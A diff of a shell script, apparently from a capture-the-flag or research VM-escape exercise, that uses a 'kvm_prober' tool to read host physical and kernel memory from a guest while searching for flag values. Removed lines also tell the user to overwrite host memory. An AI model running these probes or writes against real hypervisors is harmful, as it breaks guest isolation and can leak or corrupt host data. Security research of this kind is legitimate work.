@@ -80,48 +80,17 @@ echo "[*] Write flags default value"
 echo "deadbeef41424344"
 echo "with little endian: 44434241efbeadde"
 
+echo "HPA 2 GPA = 0x3B000000"
+
+sleep 5
+echo "[*] Host view @ 0x3C000000"
+kvm_prober readhostphys 0x3C000000 64
+
+sleep 5
+echo "[*] Guest view @ 0x01000000"
+kvm_prober readhostphys 0x01000000 64
+
 echo "[*] Checking potential addresses for flags"
-
-# Scanning MMIO regions
-echo "[+] Scanning MMIO region 0x02A27968"
-kvm_prober readhostphys 0x02A27968 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x0275ef50"
-kvm_prober readhostphys 0x0275ef50 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x02b5ee10"
-kvm_prober readhostphys 0x02b5ee10 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x026279a8"
-kvm_prober readhostphys 0x026279a8 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x64279a8"
-kvm_prober readhostphys 0x64279a8 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x695ee10"
-kvm_prober readhostphys 0x695ee10 64
-sleep 5
-
-# Scanning kernel memory
-echo "[+] Scanning kernel memory 0xffffffff826279a8"
-kvm_prober readhostmem 0xffffffff826279a8 64
-sleep 5
-
-echo "[+] Scanning kernel memory 0xffffffff82b5ee10"
-kvm_prober readhostmem 0xffffffff82b5ee10 64
-sleep 5
-
-echo "[+] Scanning kernel memory 0xffffffff82A27968"
-kvm_prober readhostmem 0xffffffff82A27968 64
-sleep 5
-
-echo "[+] Scanning kernel memory 0xffffffff8275ef50"
-kvm_prober readhostmem 0xffffffff8275ef50 64
 
 sleep 5
 
@@ -152,23 +121,5 @@ echo "with little endian: 44434241efbeadde"
 
 sleep 5
 
-echo "[*] Checking for write_flag @ 0x615b99a8 using command kvm_prober readhostphys 0x615b99a8 64"
-kvm_prober readhostphys 0x615b99a8 64
-
-Sleep 5
-
-echo "[*] Checking for write_flag @ 0x5f4deb87 using command kvm_prober readhostphys 0x5f4deb87 64"
-kvm_prober readhostphys 0x5f4deb87 64
-
-sleep 5
-
-echo "[*] look for 44434241efbeadde at both locations"
-
-sleep 5
-
-echo "[*] If it's present, run kvm_prober writehostphys 0x615b99a8 0x4141414141414141 and kvm_prober writehostphys 0x5f4deb87 0x4141414141414141" 
-
-sleep 5
-
 echo "[*] testing kvm_prober readhostphys 0x5f4deb00 256"
-kvm_prober readhostphys 0x5f4deb00 256
+kvm_prober readhostphys 0x76000000 4096
